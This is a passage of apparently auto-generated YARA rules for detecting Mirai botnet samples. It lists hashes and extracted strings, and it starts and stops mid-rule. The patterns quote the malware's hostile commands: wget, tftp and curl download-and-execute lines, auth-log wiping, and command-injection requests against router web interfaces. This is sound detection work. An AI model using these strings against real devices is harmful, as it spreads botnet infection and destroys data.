      hash3 = "c7262411abf8efb467bf07b75a78cb0b98a68a0c6480c2acdfe2e9dd7f37fcf4"
      hash4 = "c83428ec5e156733c527a074467fef85b161cbef2f65f94b3e72e8c8b3f5e49a"
      hash5 = "cac1190da7130f97fb7abbf9c5266ade24d2045abb4d4626cfbd801938ac88b6"
      hash6 = "cc8bef06c2dbae794aa558c199028602c34c09f1991c5d2fa0ca3ce4b9525f84"
   strings:
      $s1 = "/bin/busybox wget %s%s -O .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s2 = "/bin/busybox tftp -g %s -P %u -r %s -l .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s3 = "curl %s%s -o .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '25.00'*/
      $s4 = "echo > /var/log/auth.log 2>/dev/null" fullword ascii /* score: '23.00'*/
      $s5 = "[%s:%d->%s:%d] USER-AGENT: %s" fullword ascii /* score: '22.50'*/
      $s6 = "[%s:%d->%s:%d] PASSWORD: %s" fullword ascii /* score: '21.50'*/
      $s7 = "sysctl -w net.ipv6.conf.all.forwarding=1 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s8 = "Coded at 3 AM on Adderall - you can tell" fullword ascii /* score: '20.00'*/
      $s9 = "[HTTP POST/PUT] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s10 = "[PRIORITY - %s] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s11 = "User-Agent: curl" fullword ascii /* score: '17.00'*/
      $s12 = "user-agent: " fullword ascii /* score: '17.00'*/
      $s13 = "sysctl -w net.ipv4.ip_forward=1 2>/dev/null" fullword ascii /* score: '17.00'*/
      $s14 = "User-Agent: wget" fullword ascii /* score: '17.00'*/
      $s15 = "HOST:%s|KERNEL:%s|ARCH:%s|" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__9ffa58f4_Mirai_signature__a1a57a79_Mirai_signature__a9e5111e_Mirai_signature__afb357b5_Mirai_signature__b0_1 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_9ffa58f4.elf, Mirai(signature)_a1a57a79.elf, Mirai(signature)_a9e5111e.elf, Mirai(signature)_afb357b5.elf, Mirai(signature)_b0daf20a.elf, Mirai(signature)_b2da7cd2.elf, Mirai(signature)_bfbf8ae9.elf, Mirai(signature)_ca850b60.elf, Mirai(signature)_ce8b65f3.elf, Mirai(signature)_de6a5bce.elf, Mirai(signature)_e032b396.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9ffa58f4f8d763c2eb670d267f706bd562d788210079779662f703275faa4d93"
      hash2 = "a1a57a79355c4ed9c1cb2786fddccae16bd25551c57e56dabcf3e1017ccd5c2c"
      hash3 = "a9e5111efde980857a5e9bc0085d81036ab7e2ae2ee681bd5fc17f3e229da73a"
      hash4 = "afb357b53a45f1c96b8f4e789b9a0ae9bdc2c72c59254774c1ee16d8542453d2"
      hash5 = "b0daf20ab513aa4a63d9e4026f08b739eb1fa5eb3a0792c788950d258568e83f"
      hash6 = "b2da7cd2a97d38112d334b2ad74e36c46856d4bbe4784a2a4555bd42ed8d1ab8"
      hash7 = "bfbf8ae925c90cabee33555654fe21f30e4eed401f15c8f0a82d3a2f7f0b8957"
      hash8 = "ca850b60aa65de291706b23f164be1602fbefba9c4f37ab04af2221f6b48fb49"
      hash9 = "ce8b65f3a918e1b0980dd4b7760675949276ba2f6edba26c61a1ff8adb0a8cb0"
      hash10 = "de6a5bcedf632486427a9446a2f25b7f2e0b58c1429d2a8e665d9fcd80e7b9fe"
      hash11 = "e032b396c5dbed3b76401b38d5069453f8aca9f819273dfc1128ba93bc41c7f1"
   strings:
      $s1 = "SPOOFEDHASH" fullword ascii /* score: '19.50'*/
      $s2 = "dakuexecbin" fullword ascii /* score: '19.00'*/
      $s3 = "sefaexec" fullword ascii /* score: '16.00'*/
      $s4 = "deexec" fullword ascii /* score: '13.00'*/
      $s5 = "1337SoraLOADER" fullword ascii /* score: '13.00'*/
      $s6 = "SO190Ij1X" fullword ascii /* base64 encoded string*/ /* score: '11.00'*/
      $s7 = "airdropmalware" fullword ascii /* score: '10.00'*/
      $s8 = "trojan" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s9 = "GhostWuzHere666" fullword ascii /* score: '10.00'*/
      $s10 = "scanmpsl" fullword ascii /* score: '9.00'*/
      $s11 = "scanmips" fullword ascii /* score: '9.00'*/
      $s12 = "scanppc" fullword ascii /* score: '9.00'*/
      $s13 = "scanspc" fullword ascii /* score: '9.00'*/
      $s14 = "mioribitches" fullword ascii /* score: '8.00'*/
      $s15 = "urasgbsigboa" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__a0aae98d_Mirai_signature__a1a57a79_Mirai_signature__a7782f07_Mirai_signature__a955d1de_Mirai_signature__a9_2 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_a0aae98d.elf, Mirai(signature)_a1a57a79.elf, Mirai(signature)_a7782f07.elf, Mirai(signature)_a955d1de.elf, Mirai(signature)_a9f3dc62.elf, Mirai(signature)_ab1a7156.elf, Mirai(signature)_b2a54e13.elf, Mirai(signature)_b391f3ae.elf, Mirai(signature)_b646bfa3.elf, Mirai(signature)_b65f040a.elf, Mirai(signature)_b6925a4f.elf, Mirai(signature)_cb5f5c2e.elf, Mirai(signature)_cdb9c317.elf, Mirai(signature)_cf98d470.elf, Mirai(signature)_d31e8855.elf, Mirai(signature)_d392be4c.elf, Mirai(signature)_d6e9d421.elf, Mirai(signature)_d73e6abe.elf, Mirai(signature)_da3d8936.elf, Mirai(signature)_dfb65153.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a0aae98d641557bb5b775af473307e79287e5a8927d9aa1467b679e13831792e"
      hash2 = "a1a57a79355c4ed9c1cb2786fddccae16bd25551c57e56dabcf3e1017ccd5c2c"
      hash3 = "a7782f07e442c83680b0a1101c60f43fa194b6405bcbff363d42c1d0058b2736"
      hash4 = "a955d1defe06a8702d945793ee19ed02a098cc4a8a50cb44c4f5f82f4f152ce1"
      hash5 = "a9f3dc6236dee4a917c64d804c58d7241f9a92b61f80dbb4a2a3308a05078ef5"
      hash6 = "ab1a7156179e8ba66177bfe455a2a00e0bdec190e2dda53fe046518853d93a06"
      hash7 = "b2a54e13e03e19e848982f883963aa348d3b81e60efe9c1712a83784c2b5656b"
      hash8 = "b391f3ae4b7b03e28f317ae80c6a949c20f623bef1a6b1d7cdce63a23cf50b29"
      hash9 = "b646bfa3292cbce40fbb72d96ce1263926a356c33713cb4106969b4aacecd8ab"
      hash10 = "b65f040a3b87b12ad0b1565d38f0e3a0efd2ed859ea6f5a2db1ab61c6e88cf26"
      hash11 = "b6925a4f568219c0eb6e884665bfeabc397cce00858a77437be3474b5d8486a9"
      hash12 = "cb5f5c2e2180ceb3738a62d920c0cf09a6d6cce9541f86f3d798d25798217c3a"
      hash13 = "cdb9c317ae9c447f64020b0943c0522ddaa003b17851f44a8ab8f9a92e561ca3"
      hash14 = "cf98d470c9f9d88d683fa757f8ad2d3b72f1a0c76de75b1f3a345caebe5f9cde"
      hash15 = "d31e8855bd0463e79991a7f445de36062fb457d4f1fd2f04a0e47d9873a23f7c"
      hash16 = "d392be4c88e746a9b0952c4d250d330e5354b35dc7857fe72d04e95228d9c420"
      hash17 = "d6e9d421b65a703f8f1898124dfd7503cfb76b9ff505e78355a7dea90218ea1a"
      hash18 = "d73e6abeafdd5fd32c40508f380059f38624a9cb46f556e94ab93d5db3f81746"
      hash19 = "da3d893654372e232ab1b03ceeca37ee1c5d6441feedc4e311079711efde1dbd"
      hash20 = "dfb65153392e481a0235f8c2d89b2f076a81b72b9efc2c6d3560ac1c7fd0b391"
   strings:
      $s1 = "_Unwind_decode_target2" fullword ascii /* score: '16.00'*/
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii /* score: '14.00'*/
      $s3 = "__gnu_unwind_execute" fullword ascii /* score: '14.00'*/
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii /* score: '11.00'*/
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii /* score: '11.00'*/
      $s6 = "_Unwind_VRS_Get" fullword ascii /* score: '9.00'*/
      $s7 = "_Unwind_EHT_Header" fullword ascii /* score: '9.00'*/
      $s8 = "getsockopt.c" fullword ascii /* score: '9.00'*/
      $s9 = "bitpattern" fullword ascii /* score: '8.00'*/
      $s10 = "fnoffset" fullword ascii /* score: '8.00'*/
      $s11 = "fnstart" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__9f09a1fa_Mirai_signature__adc00112_Mirai_signature__afb357b5_Mirai_signature__afda3b08_Mirai_signature__bc_3 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_9f09a1fa.elf, Mirai(signature)_adc00112.elf, Mirai(signature)_afb357b5.elf, Mirai(signature)_afda3b08.elf, Mirai(signature)_bc664992.elf, Mirai(signature)_bfdb9dee.elf, Mirai(signature)_c2036f03.elf, Mirai(signature)_ce8b65f3.elf, Mirai(signature)_d7ce9f38.elf, Mirai(signature)_dd9e67fc.elf, Mirai(signature)_defc9fd7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9f09a1fac7a028af8255a299ce103dfa0c4b94fc4458f0587bf14736baa65134"
      hash2 = "adc00112fd1d062a75d27bea8ad96e00b902a609cc3585e2466bdb4c7a0e5dfb"
      hash3 = "afb357b53a45f1c96b8f4e789b9a0ae9bdc2c72c59254774c1ee16d8542453d2"
      hash4 = "afda3b0865fe633cce50a9e11af441aeb5f66079c3f821607a6c7f6299ee5c5e"
      hash5 = "bc664992a2cb27fe49620206516834a8d570f71e17a08ce80fb3eaa6c52acb65"
      hash6 = "bfdb9deeddac8493ea50b24b869164b389bb979d56b3e4a43d829ceff1b85938"
      hash7 = "c2036f03cbd3a36d100506ba22d71286519212442c857c9b4993f718289cba49"
      hash8 = "ce8b65f3a918e1b0980dd4b7760675949276ba2f6edba26c61a1ff8adb0a8cb0"
      hash9 = "d7ce9f389a812ea2360ec313a324f8c0e321da34eca891912806c2d665b46333"
      hash10 = "dd9e67fc4090b7af2ae256e4190546246f4c5c417a31ce05191e0813f141a68e"
      hash11 = "defc9fd73bad423fee5e4ad053c780ea3c0bcafd6d373d636bac158e7d269377"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii /* score: '20.50'*/
      $s2 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii /* score: '17.50'*/
      $s3 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s4 = "%s:%i: relocation processing: %s" fullword ascii /* score: '16.50'*/
      $s5 = "%s():%i: %s: usage count: %d" fullword ascii /* score: '14.50'*/
      $s6 = "%s():%i: running dtors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s7 = "%s():%i: __address: %p  __info: %p" fullword ascii /* score: '12.50'*/
      $s8 = "%s():%i: running ctors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s9 = "%s():%i: Lib: %s already opened" fullword ascii /* score: '12.50'*/
      $s10 = "////////////," fullword ascii /* reversed goodware string ',////////////' */ /* score: '11.00'*/
      $s11 = "&|||||" fullword ascii /* reversed goodware string '|||||&' */ /* score: '11.00'*/
      $s12 = "m|||||||" fullword ascii /* reversed goodware string '|||||||m' */ /* score: '11.00'*/
      $s13 = "searching RUNPATH='%s'" fullword ascii /* score: '10.00'*/
      $s14 = "%s():%i: unmapping: %s" fullword ascii /* score: '9.50'*/
      $s15 = "%s:%i: RELRO protecting %s:  start:%x, end:%x" fullword ascii /* score: '9.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__a0aae98d_Mirai_signature__a1a57a79_Mirai_signature__a7782f07_Mirai_signature__a955d1de_Mirai_signature__a9_4 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_a0aae98d.elf, Mirai(signature)_a1a57a79.elf, Mirai(signature)_a7782f07.elf, Mirai(signature)_a955d1de.elf, Mirai(signature)_a9f3dc62.elf, Mirai(signature)_ab1a7156.elf, Mirai(signature)_b2a54e13.elf, Mirai(signature)_b391f3ae.elf, Mirai(signature)_b53d4781.elf, Mirai(signature)_b646bfa3.elf, Mirai(signature)_b65f040a.elf, Mirai(signature)_b6925a4f.elf, Mirai(signature)_cb4a3665.elf, Mirai(signature)_cb5f5c2e.elf, Mirai(signature)_cdb9c317.elf, Mirai(signature)_cf98d470.elf, Mirai(signature)_d31e8855.elf, Mirai(signature)_d392be4c.elf, Mirai(signature)_d3d7315e.elf, Mirai(signature)_d6e9d421.elf, Mirai(signature)_d73e6abe.elf, Mirai(signature)_d8018e31.elf, Mirai(signature)_da3d8936.elf, Mirai(signature)_de5fb680.elf, Mirai(signature)_dfb65153.elf, Mirai(signature)_dfd83036.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a0aae98d641557bb5b775af473307e79287e5a8927d9aa1467b679e13831792e"
      hash2 = "a1a57a79355c4ed9c1cb2786fddccae16bd25551c57e56dabcf3e1017ccd5c2c"
      hash3 = "a7782f07e442c83680b0a1101c60f43fa194b6405bcbff363d42c1d0058b2736"
      hash4 = "a955d1defe06a8702d945793ee19ed02a098cc4a8a50cb44c4f5f82f4f152ce1"
      hash5 = "a9f3dc6236dee4a917c64d804c58d7241f9a92b61f80dbb4a2a3308a05078ef5"
      hash6 = "ab1a7156179e8ba66177bfe455a2a00e0bdec190e2dda53fe046518853d93a06"
      hash7 = "b2a54e13e03e19e848982f883963aa348d3b81e60efe9c1712a83784c2b5656b"
      hash8 = "b391f3ae4b7b03e28f317ae80c6a949c20f623bef1a6b1d7cdce63a23cf50b29"
      hash9 = "b53d4781bbadb17014da280e274e11f2de9063a35f2eabd32d4596707b147306"
      hash10 = "b646bfa3292cbce40fbb72d96ce1263926a356c33713cb4106969b4aacecd8ab"
      hash11 = "b65f040a3b87b12ad0b1565d38f0e3a0efd2ed859ea6f5a2db1ab61c6e88cf26"
      hash12 = "b6925a4f568219c0eb6e884665bfeabc397cce00858a77437be3474b5d8486a9"
      hash13 = "cb4a3665ebd12bdb094b9fc188793c67ec3008363a49b1dde00d488b54df984b"
      hash14 = "cb5f5c2e2180ceb3738a62d920c0cf09a6d6cce9541f86f3d798d25798217c3a"
      hash15 = "cdb9c317ae9c447f64020b0943c0522ddaa003b17851f44a8ab8f9a92e561ca3"
      hash16 = "cf98d470c9f9d88d683fa757f8ad2d3b72f1a0c76de75b1f3a345caebe5f9cde"
      hash17 = "d31e8855bd0463e79991a7f445de36062fb457d4f1fd2f04a0e47d9873a23f7c"
      hash18 = "d392be4c88e746a9b0952c4d250d330e5354b35dc7857fe72d04e95228d9c420"
      hash19 = "d3d7315e0dee9584317e7a5bfc266b4b265e389971e15b54f3d588ea5bb328b7"
      hash20 = "d6e9d421b65a703f8f1898124dfd7503cfb76b9ff505e78355a7dea90218ea1a"
      hash21 = "d73e6abeafdd5fd32c40508f380059f38624a9cb46f556e94ab93d5db3f81746"
      hash22 = "d8018e31b77b135ed300a988757f409347d013b76f9c9a4972e48cb715f45967"
      hash23 = "da3d893654372e232ab1b03ceeca37ee1c5d6441feedc4e311079711efde1dbd"
      hash24 = "de5fb68023465cb5d8ace412e11032d98a41bd6af2a83245c046020530130496"
      hash25 = "dfb65153392e481a0235f8c2d89b2f076a81b72b9efc2c6d3560ac1c7fd0b391"
      hash26 = "dfd830368724f6abcc542bc8b85e3d5fa2aedf8282d3805d0d6d53f45c7e0937"
   strings:
      $s1 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s3 = "fgets_unlocked.c" fullword ascii /* score: '9.00'*/
      $s4 = "getgid.c" fullword ascii /* score: '9.00'*/
      $s5 = "__GI_fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s6 = "fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s7 = "__GI_getegid" fullword ascii /* score: '9.00'*/
      $s8 = "getegid.c" fullword ascii /* score: '9.00'*/
      $s9 = "__getdents64" fullword ascii /* score: '9.00'*/
      $s10 = "geteuid.c" fullword ascii /* score: '9.00'*/
      $s11 = "fgets.c" fullword ascii /* score: '9.00'*/
      $s12 = "__GI_gettimeofday" fullword ascii /* score: '9.00'*/
      $s13 = "__GI___fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s14 = "getpid.c" fullword ascii /* score: '9.00'*/
      $s15 = "getdents64.c" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b53d4781_Mirai_signature__cb4a3665_Mirai_signature__d8018e31_Mirai_signature__de5fb680_Mirai_signature__df_5 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b53d4781.elf, Mirai(signature)_cb4a3665.elf, Mirai(signature)_d8018e31.elf, Mirai(signature)_de5fb680.elf, Mirai(signature)_dfd83036.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b53d4781bbadb17014da280e274e11f2de9063a35f2eabd32d4596707b147306"
      hash2 = "cb4a3665ebd12bdb094b9fc188793c67ec3008363a49b1dde00d488b54df984b"
      hash3 = "d8018e31b77b135ed300a988757f409347d013b76f9c9a4972e48cb715f45967"
      hash4 = "de5fb68023465cb5d8ace412e11032d98a41bd6af2a83245c046020530130496"
      hash5 = "dfd830368724f6abcc542bc8b85e3d5fa2aedf8282d3805d0d6d53f45c7e0937"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '42.00'*/
      $x2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '41.00'*/
      $x3 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '37.00'*/
      $x4 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"htt" ascii /* score: '34.00'*/
      $x5 = "orks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMapp" ascii /* score: '31.00'*/
      $x6 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s/spim+-O+/tmp/netgear;sh+netgear&curpath=/&curr" ascii /* score: '31.00'*/
      $x7 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s/spim+-O+/tmp/netgear;sh+netgear&curpath=/&curr" ascii /* score: '31.00'*/
      $x8 = "ient>`cd /tmp/; rm -rf*; wget http://%s/spim`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing<" ascii /* score: '31.00'*/
      $s9 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '30.00'*/
      $s10 = "GET /shell?cd+/tmp;rm+-rf+*;wget+http://%s/l7vmra;chmod+777+l7vmra;/tmp/l7vmra HTTP/1.1" fullword ascii /* score: '27.00'*/
      $s11 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://%s/l7vmra;chmod+777+l7vmra;/tmp/l7vmra" fullword ascii /* score: '27.00'*/
      $s12 = "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F" ascii /* score: '27.00'*/
      $s13 = " -g %s -l /tmp/huawei -r /spim;chmod -x huawei;/tmp/huawei huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownload" ascii /* score: '27.00'*/
      $s14 = "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F" ascii /* score: '23.00'*/
      $s15 = "ient>`cd /tmp/;chmod +x spim;./spim`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortM" ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__cb5f5c2e_Mirai_signature__d31e8855_Mirai_signature__d392be4c_Mirai_signature__d73e6abe_6 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_cb5f5c2e.elf, Mirai(signature)_d31e8855.elf, Mirai(signature)_d392be4c.elf, Mirai(signature)_d73e6abe.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cb5f5c2e2180ceb3738a62d920c0cf09a6d6cce9541f86f3d798d25798217c3a"
      hash2 = "d31e8855bd0463e79991a7f445de36062fb457d4f1fd2f04a0e47d9873a23f7c"
      hash3 = "d392be4c88e746a9b0952c4d250d330e5354b35dc7857fe72d04e95228d9c420"
      hash4 = "d73e6abeafdd5fd32c40508f380059f38624a9cb46f556e94ab93d5db3f81746"
   strings:
      $s1 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s2 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
      $s3 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_unlock_full" fullword ascii /* score: '18.00'*/
      $s5 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s6 = "__make_stacks_executable" fullword ascii /* score: '12.00'*/
      $s7 = "pthread_getspecific.c" fullword ascii /* score: '12.00'*/
      $s8 = "read_encoded_value_with_base" fullword ascii /* score: '12.00'*/
      $s9 = "read_encoded_value" fullword ascii /* score: '12.00'*/
      $s10 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc" fullword ascii /* score: '11.00'*/
      $s11 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/unwind-c.c" fullword ascii /* score: '11.00'*/
      $s12 = "pthread_key_delete.c" fullword ascii /* score: '10.00'*/
      $s13 = "_thread_db_pthread_key_data_data" fullword ascii /* score: '10.00'*/
      $s14 = "_thread_db_pthread_key_struct_destr" fullword ascii /* score: '10.00'*/
      $s15 = "__pthread_keys" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__9f09a1fa_Mirai_signature__a6b63acf_Mirai_signature__ace77db8_Mirai_signature__aed2684c_Mirai_signature__b2_7 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_9f09a1fa.elf, Mirai(signature)_a6b63acf.elf, Mirai(signature)_ace77db8.elf, Mirai(signature)_aed2684c.elf, Mirai(signature)_b231dca7.elf, Mirai(signature)_b5432303.elf, Mirai(signature)_b9e6d81e.elf, Mirai(signature)_bc18d26b.elf, Mirai(signature)_bc664992.elf, Mirai(signature)_c2f4418b.elf, Mirai(signature)_c304393b.elf, Mirai(signature)_c6287737.elf, Mirai(signature)_c8b6771f.elf, Mirai(signature)_cb5f5c2e.elf, Mirai(signature)_cbd6296b.elf, Mirai(signature)_cc9e3877.elf, Mirai(signature)_cdb09620.elf, Mirai(signature)_cf5a8021.elf, Mirai(signature)_d099bbc6.elf, Mirai(signature)_d31e8855.elf, Mirai(signature)_d490d161.elf, Mirai(signature)_da498da6.elf, Mirai(signature)_db218111.elf, Mirai(signature)_dd9e67fc.elf, Mirai(signature)_ded92df2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9f09a1fac7a028af8255a299ce103dfa0c4b94fc4458f0587bf14736baa65134"
      hash2 = "a6b63acfbcc69f6baecc415e8098e26ece3abefb2410350fc782091dbd17f0d3"
      hash3 = "ace77db8aa98e2d72be06bdf7198156227ef9361b0eb503621119776b251805e"
      hash4 = "aed2684ce2281e414afb53f7a22f73cda2f302bdd6642ed3fede62f58bd64cb0"
      hash5 = "b231dca721cce75dbc61fd4cba5f74f1ceadeeb53e77361a948bd41adb4beae9"
      hash6 = "b54323035aa1ff2acc01fc8b5620504b6c15f1aaa7ffe2daf813449ddd420ee2"
      hash7 = "b9e6d81e69b3465ea7eabba8a23dd228c7da4817ca6f7287134342db0035938f"
      hash8 = "bc18d26b8250b4ab63424b39b97e3efa97967c5538c19fe497e78aa6d859512c"
      hash9 = "bc664992a2cb27fe49620206516834a8d570f71e17a08ce80fb3eaa6c52acb65"
      hash10 = "c2f4418ba2d9f31dbbb1f0a69a9f9adc6a66256d2d11d0087bd64067fdebdf83"
      hash11 = "c304393ba97f7d02803f6ce97f496a2f724d48a2b51c8002bf7e668c875f19f9"
      hash12 = "c6287737f5a1d1fe46a5e74b20ca39d747f3ea07e0390104f62932c0534bf363"
      hash13 = "c8b6771fd48f277a40bed562ad8e3d6eefeb4c8736bde596a658342e4cafe51c"
      hash14 = "cb5f5c2e2180ceb3738a62d920c0cf09a6d6cce9541f86f3d798d25798217c3a"
      hash15 = "cbd6296b5bf06484226496e256fe6e47b7906cdaaed57298b426e9d9e6f4e61b"
      hash16 = "cc9e38778b68071bce9b1308bff956bb65e109cfbe1bd5c27c904f8e1429d1d9"
      hash17 = "cdb0962013439d621a034a7b0e1a981fde907feff8bde1297743d4853084b98e"
      hash18 = "cf5a802122e42bb3a9390bcec6aaf1c0d0b1a84215706d06ae6d3a427c329d42"
      hash19 = "d099bbc6025d2caf98129bd7828e24be44af5703de2ff7983bf05baeab94b257"
      hash20 = "d31e8855bd0463e79991a7f445de36062fb457d4f1fd2f04a0e47d9873a23f7c"
      hash21 = "d490d161287ee404fb5ea94b46f7e46e20597fefa77764b576226042bdc4c18e"
      hash22 = "da498da61bc9fe62c5b6e192d921f3faa76f0b154331e177de584db2a1d9593f"
      hash23 = "db2181117644d92b9d38c775456fde7143075c579a033e02bf1dd1c934d1db3a"
      hash24 = "dd9e67fc4090b7af2ae256e4190546246f4c5c417a31ce05191e0813f141a68e"
      hash25 = "ded92df2f33efea20f9ecfc7ae7f0cd3552403ca1bd226acce208b116ab361ec"
   strings:
      $s1 = "GET /?%s%d HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s2 = "test@example.com" fullword ascii /* score: '18.00'*/
      $s3 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" fullword ascii /* score: '17.00'*/
      $s4 = "/downloads/brochure.pdf" fullword ascii /* score: '13.00'*/
      $s5 = "/login" fullword ascii /* score: '12.00'*/
      $s6 = "/assets/images/logo.png" fullword ascii /* score: '12.00'*/
      $s7 = "/wp-content/uploads/2023/" fullword ascii /* score: '11.00'*/
      $s8 = "Product description text" fullword ascii /* score: '10.00'*/
      $s9 = "Warning: Failed to load proxies, continuing with direct connections" fullword ascii /* score: '10.00'*/
      $s10 = "\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\"" fullword ascii /* score: '9.00'*/
      $s11 = "/api/v1/users" fullword ascii /* score: '9.00'*/
      $s12 = "200 Connection established" fullword ascii /* score: '9.00'*/
      $s13 = "This is a test message with some content" fullword ascii /* score: '9.00'*/
      $s14 = "\"Opera\";v=\"107\", \"Chromium\";v=\"121\", \"Not?A_Brand\";v=\"24\"" fullword ascii /* score: '9.00'*/
      $s15 = "%s%s=%s%s" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__9f09a1fa_Mirai_signature__a6b63acf_Mirai_signature__aa22ecce_Mirai_signature__ace77db8_Mirai_signature__ae_8 {
   meta:
